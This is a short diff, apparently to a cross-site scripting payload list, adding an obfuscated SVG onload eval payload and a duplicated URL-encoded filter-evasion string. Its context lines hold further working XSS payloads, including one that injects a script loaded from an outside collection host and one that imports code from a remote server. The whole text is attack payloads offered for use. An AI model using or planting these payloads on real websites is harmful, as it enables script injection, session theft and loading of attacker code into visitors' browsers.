@@ -2680,3 +2680,5 @@ var a=document.createElement("script");a.src="https://xss.report/c/department";d
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 '"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<svg onload=onerror=eval,new'\u0022-alert\x281\x29//'>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
